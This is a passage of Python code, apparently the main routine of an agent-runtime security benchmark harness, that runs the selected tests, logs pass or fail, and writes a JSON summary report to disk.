    selected = [t for t in TESTS if (not args.core or t[0] in CORE) and (not args.only or t[0] in args.only.split(","))]
    started = time.time()
    results = []
    for tid, name, prio, fn in selected:
        b.log(f"--> {name} ...")
        t0 = time.time()
        try:
            passed, observed, tel = getattr(b, fn)()
            err = None
        except Exception as e:  # noqa: BLE001
            passed, observed, tel, err = False, {}, None, f"{e.__class__.__name__}: {e}"
            b.log(traceback.format_exc())
        res = {"id": tid, "name": name, "priority": prio, "core": tid in CORE, "passed": bool(passed),
               "duration_s": round(time.time() - t0, 2), "observed": observed, "error": err,
               "telemetry": tel_summary(tel) if tel else None}
        results.append(res)
        b.log(f"    {'PASS' if passed else 'FAIL'} ({res['duration_s']}s)")
    core_res = [r for r in results if r["core"]]
    p0_res = [r for r in results if r["priority"] == "P0"]
    report = {
        "benchmark": "vultr-agent-runtime-security", "version": VERSION, "host": socket.gethostname(),
        "runtime_url": BASE, "runtime_health": health, "oci_runtime": health.get("oci_runtime"),
        "started_at": started, "finished_at": time.time(),
        "selection": "core" if args.core else ("custom" if args.only else "full"),
        "core_tests": CORE,
        "core_passed": len(core_res) == len(CORE) and all(r["passed"] for r in core_res) and all(r["passed"] for r in p0_res),
        "all_passed": all(r["passed"] for r in results),
        "summary": {"total": len(results), "passed": sum(r["passed"] for r in results),
                    "failed": sum(not r["passed"] for r in results)},
        "tests": results,
    }
    text = json.dumps(report, indent=2, default=str)
    if not args.no_publish:
        os.makedirs(f"{DATA}/benchmark", exist_ok=True)
        stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
        for p in (f"{DATA}/benchmark/latest.json", f"{DATA}/benchmark/run-{stamp}.json"):
            with open(p, "w") as f:
                f.write(text)
    if args.json_out:
        with open(args.json_out, "w") as f:
            f.write(text)
    print(text if args.quiet else json.dumps(report["summary"]))
    return 0 if report["all_passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
